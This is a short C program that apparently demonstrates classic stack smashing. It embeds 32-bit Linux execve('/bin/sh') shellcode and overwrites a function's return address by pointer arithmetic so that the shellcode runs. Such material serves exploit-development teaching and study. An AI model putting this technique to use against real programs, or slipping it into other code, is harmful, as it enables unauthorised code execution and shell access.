static char *s;

int
dummy()
{
  unsigned int x;
  unsigned int *p;

  /* Have p point to x */
  p = &x;

  /* Have p point to EBP */
  p++;

  /* Have p point to the return address */
  p++;
	p++;

  /* Overwrite the return address with the shellcode address */
  *p = (unsigned int)s;

  return (0);
}

int
main()
{
  char shellcode[] =
    "\xeb\x12\x5e\x31\xc0\x88\x46\x07"
    "\x50\x56\x31\xd2\x89\xe1\x89\xf3"
    "\xb0\x0b\xcd\x80\xe8\xe9\xff\xff"
    "\xff\x2f\x62\x69\x6e\x2f\x73\x68";

  /* Point s at the shellcode on the stack */
  s = shellcode;

  dummy();

  return (0);
}
